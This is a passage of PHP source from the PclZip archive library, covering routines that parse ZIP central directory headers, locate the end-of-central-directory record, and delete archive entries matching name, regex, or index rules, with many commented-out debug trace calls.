    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header (Hex) : '".bin2hex($v_binary_data)."'");
    $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

    // ----- Get filename
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "File name length : ".$p_header['filename_len']);
    if ($p_header['filename_len'] != 0)
      $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
    else
      $p_header['filename'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Filename : \''.$p_header['filename'].'\'');

    // ----- Get extra
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Extra length : ".$p_header['extra_len']);
    if ($p_header['extra_len'] != 0)
      $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
    else
      $p_header['extra'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Extra : \''.$p_header['extra'].'\'');

    // ----- Get comment
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Comment length : ".$p_header['comment_len']);
    if ($p_header['comment_len'] != 0)
      $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
    else
      $p_header['comment'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Comment : \''.$p_header['comment'].'\'');

    // ----- Extract properties
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version : \''.($p_header['version']/10).'.'.($p_header['version']%10).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version need to extract : \''.($p_header['version_extracted']/10).'.'.($p_header['version_extracted']%10).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Size : \''.$p_header['size'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Compressed Size : \''.$p_header['compressed_size'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'CRC : \''.sprintf("0x%X", $p_header['crc']).'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Flag : \''.$p_header['flag'].'\'');
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Offset : \''.$p_header['offset'].'\'');

    // ----- Recuperate date in UNIX format
    //if ($p_header['mdate'] && $p_header['mtime'])
    // TBC : bug : this was ignoring time with 0/0/0
    if (1)
    {
      // ----- Extract time
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;

      // ----- Extract date
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;

      // ----- Get UNIX date format
      $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }
    else
    {
      $p_header['mtime'] = time();
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Date is actual : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }

    // ----- Set the stored filename
    $p_header['stored_filename'] = $p_header['filename'];

    // ----- Set default status to ok
    $p_header['status'] = 'ok';

    // ----- Look if it is a directory
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Internal (Hex) : '".sprintf("Ox%04X", $p_header['internal'])."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "External (Hex) : '".sprintf("Ox%04X", $p_header['external'])."' (".(($p_header['external']&0x00000010)==0x00000010?'is a folder':'is a file').')');
    if (substr($p_header['filename'], -1) == '/') {
      //$p_header['external'] = 0x41FF0010;
      $p_header['external'] = 0x00000010;
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Force folder external : \''.sprintf("Ox%04X", $p_header['external']).'\'');
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Header of filename : \''.$p_header['filename'].'\'');

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCheckFileHeaders()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success,
  //   0 on error;
  // --------------------------------------------------------------------------------
  function privCheckFileHeaders(&$p_local_header, &$p_central_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCheckFileHeaders", "");
    $v_result=1;

        // ----- Check the static values
        // TBC
        if ($p_local_header['filename'] != $p_central_header['filename']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "filename" : TBC To Be Completed');
        }
        if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "version_extracted" : TBC To Be Completed');
        }
        if ($p_local_header['flag'] != $p_central_header['flag']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "flag" : TBC To Be Completed');
        }
        if ($p_local_header['compression'] != $p_central_header['compression']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "compression" : TBC To Be Completed');
        }
        if ($p_local_header['mtime'] != $p_central_header['mtime']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "mtime" : TBC To Be Completed');
        }
        if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Bad check "filename_len" : TBC To Be Completed');
        }

        // ----- Look for flag bit 3
        if (($p_local_header['flag'] & 8) == 8) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Purpose bit flag bit 3 set !');
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'File size, compression size and crc found in central header');
        $p_local_header['size'] = $p_central_header['size'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size : \''.$p_local_header['size'].'\'');
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compressed Size : \''.$p_local_header['compressed_size'].'\'');
        $p_local_header['crc'] = $p_central_header['crc'];
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'CRC : \''.sprintf("0x%X", $p_local_header['crc']).'\'');
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadEndCentralDir()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadEndCentralDir(&$p_central_dir)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadEndCentralDir", "");
    $v_result=1;

    // ----- Go to the end of the zip file
    $v_size = filesize($this->zipname);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Size of the file :$v_size");
    @fseek($this->zip_fd, $v_size);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position at end of zip file : \''.ftell($this->zip_fd).'\'');
    if (@ftell($this->zip_fd) != $v_size)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- First try : look if this is an archive with no commentaries (most of the time)
    // in this case the end of central dir is at 22 bytes of the file end
    $v_found = 0;
    if ($v_size > 26) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Look for central dir with no comment');
      @fseek($this->zip_fd, $v_size-22);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position after min central position : \''.ftell($this->zip_fd).'\'');
      if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
      {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Read for bytes
      $v_binary_data = @fread($this->zip_fd, 4);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
      $v_data = @unpack('Vid', $v_binary_data);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

      // ----- Check signature
      if ($v_data['id'] == 0x06054b50) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found central dir at the default position.");
        $v_found = 1;
      }

      $v_pos = ftell($this->zip_fd);
    }

    // ----- Go back to the maximum possible size of the Central Dir End Record
    if (!$v_found) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Start extended search of end central dir');
      $v_maximum_size = 65557; // 0xFFFF + 22;
      if ($v_maximum_size > $v_size)
        $v_maximum_size = $v_size;
      @fseek($this->zip_fd, $v_size-$v_maximum_size);
      if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
      {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Position after max central position : \''.ftell($this->zip_fd).'\'');

      // ----- Read byte per byte in order to find the signature
      $v_pos = ftell($this->zip_fd);
      $v_bytes = 0x00000000;
      while ($v_pos < $v_size)
      {
        // ----- Read a byte
        $v_byte = @fread($this->zip_fd, 1);

        // -----  Add the byte
        $v_bytes = ($v_bytes << 8) | Ord($v_byte);

        // ----- Compare the bytes
        if ($v_bytes == 0x504b0506)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Found End Central Dir signature at position : \''.ftell($this->zip_fd).'\'');
          $v_pos++;
          break;
        }

        $v_pos++;
      }

      // ----- Look if not found end of central dir
      if ($v_pos == $v_size)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to find End of Central Dir Record signature");

        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
    }

    // ----- Read the first 18 bytes of the header
    $v_binary_data = fread($this->zip_fd, 18);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 18)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Central Dir Record : '".$v_binary_data."'");
    ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Central Dir Record (Hex) : '".bin2hex($v_binary_data)."'");
    $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

    // ----- Check the global size
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Comment length : ".$v_data['comment_size']);
    if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The central dir is not at the end of the archive. Some trailing bytes exists after the archive.");

          // ----- Removed in release 2.2 see readme file
          // The check of the file size is a little too strict.
          // Some bugs where found when a zip is encrypted/decrypted with 'crypt'.
          // While decrypted, zip has training 0 bytes
          if (0) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                               'The central dir is not at the end of the archive.'
                                                   .' Some trailing bytes exists after the archive.');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
          }
    }

    // ----- Get comment
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment size : \''.$v_data['comment_size'].'\'');
    if ($v_data['comment_size'] != 0) {
      $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
    }
    else
      $p_central_dir['comment'] = '';
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Comment : \''.$p_central_dir['comment'].'\'');

    $p_central_dir['entries'] = $v_data['entries'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Nb of entries : \''.$p_central_dir['entries'].'\'');
    $p_central_dir['disk_entries'] = $v_data['disk_entries'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Nb of entries for this disk : \''.$p_central_dir['disk_entries'].'\'');
    $p_central_dir['offset'] = $v_data['offset'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Offset of Central Dir : \''.$p_central_dir['offset'].'\'');
    $p_central_dir['size'] = $v_data['size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size of Central Dir : \''.$p_central_dir['size'].'\'');
    $p_central_dir['disk'] = $v_data['disk'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Disk number : \''.$p_central_dir['disk'].'\'');
    $p_central_dir['disk_start'] = $v_data['disk_start'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Start disk number : \''.$p_central_dir['disk_start'].'\'');

    // TBC
    //for(reset($p_central_dir); $key = key($p_central_dir); next($p_central_dir)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "central_dir[$key] = ".$p_central_dir[$key]);
    //}

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDeleteByRule()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDeleteByRule(&$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDeleteByRule", "");
    $v_result=1;
    $v_list_detail = array();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Scan all the files
    // ----- Start at beginning of Central Dir
    $v_pos_entry = $v_central_dir['offset'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      // ----- Close the zip file
      $this->privCloseFd();

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

    // ----- Read each entry
    $v_header_list = array();
    $j_start = 0;
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Read next file header entry (index '$i')");

      // ----- Read the file header
      $v_header_list[$v_nb_extracted] = array();
      if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
      {
        // ----- Close the zip file
        $this->privCloseFd();

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename (index '$i') : '".$v_header_list[$v_nb_extracted]['stored_filename']."'");

      // ----- Store the index
      $v_header_list[$v_nb_extracted]['index'] = $i;

      // ----- Look for the specific extract rules
      $v_found = false;

      // ----- Look for extract by name rule
      if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
          && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByName'");

          // ----- Look if the filename is in the list
          for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Compare with file '".$p_options[PCLZIP_OPT_BY_NAME][$j]."'");

              // ----- Look for a directory
              if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The searched item is a directory");

                  // ----- Look if the directory is in the filename path
                  if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                      && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The directory is in the file path");
                      $v_found = true;
                  }
                  elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) /* Indicates a folder */
                          && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The entry is the searched directory");
                      $v_found = true;
                  }
              }
              // ----- Look for a filename
              elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The file is the right one.");
                  $v_found = true;
              }
          }
      }

      // ----- Look for extract by ereg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_EREG]))
               && ($p_options[PCLZIP_OPT_BY_EREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract by ereg '".$p_options[PCLZIP_OPT_BY_EREG]."'");

          if (ereg($p_options[PCLZIP_OPT_BY_EREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_found = true;
          }
      }

      // ----- Look for extract by preg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
               && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByEreg'");

          if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_found = true;
          }
      }

      // ----- Look for extract by index rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
               && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByIndex'");

          // ----- Look if the index is in the list
          for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look if index '$i' is in [".$p_options[PCLZIP_OPT_BY_INDEX][$j]['start'].",".$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']."]");

              if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found as part of an index range");
                  $v_found = true;
              }
              if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Do not look this index range for next loop");
                  $j_start = $j+1;
              }

              if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Index range is greater than index, stop loop");
                  break;
              }
          }
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "No argument mean remove all file");
        $v_found = true;
      }

      // ----- Look for deletion
      if ($v_found)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_header_list[$v_nb_extracted]['stored_filename']."', index '$i' need to be deleted");
        unset($v_header_list[$v_nb_extracted]);
      }
      else
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_header_list[$v_nb_extracted]['stored_filename']."', index '$i' will not be deleted");
        $v_nb_extracted++;
      }
    }

    // ----- Look if something need to be deleted
    if ($v_nb_extracted > 0) {

        // ----- Creates a temporay file
        $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

        // ----- Creates a temporary zip archive
        $v_temp_zip = new PclZip($v_zip_temp_name);

        // ----- Open the temporary zip file in write mode
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary write mode");
        if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
            $this->privCloseFd();

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        // ----- Look which file need to be kept
        for ($i=0; $i<sizeof($v_header_list); $i++) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Keep entry index '$i' : '".$v_header_list[$i]['filename']."'");

            // ----- Calculate the position of the header
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset='". $v_header_list[$i]['offset']."'");
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
            @rewind($this->zip_fd);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
            if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Error log
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                return PclZip::errorCode();
            }
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

            // ----- Read the file header
            $v_local_header = array();
            if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
            
            // ----- Check that local file header is same as central file header
            if ($this->privCheckFileHeaders($v_local_header,
                                                        $v_header_list[$i]) != 1) {
                // TBC
            }
            unset($v_local_header);

            // ----- Write the file header
            if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset for this file is '".$v_header_list[$i]['offset']."'");

            // ----- Read/write the data block
            if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
        }

        // ----- Store the offset of the central dir
        $v_offset = @ftell($v_temp_zip->zip_fd);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "New offset of central dir : $v_offset");

        // ----- Re-Create the Central Dir files header
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Creates the new central directory");
        for ($i=0; $i<sizeof($v_header_list); $i++) {
            // ----- Create the file header
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset of file : ".$v_header_list[$i]['offset']);
            if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
                $v_temp_zip->privCloseFd();
                $this->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }

            // ----- Transform the header to a 'usable' info
            $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Creates the central directory footer");

        // ----- Zip file comment
        $v_comment = '';
        if (isset($p_options[PCLZIP_OPT_COMMENT])) {
          $v_comment = $p_options[PCLZIP_OPT_COMMENT];
        }

        // ----- Calculate the size of the central header
        $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

        // ----- Create the central dir footer
        if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
            // ----- Reset the file list
            unset($v_header_list);
            $v_temp_zip->privCloseFd();
            $this->privCloseFd();
            @unlink($v_zip_temp_name);

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        // ----- Close
        $v_temp_zip->privCloseFd();
        $this->privCloseFd();

        // ----- Delete the zip file
        // TBC : I should test the result ...
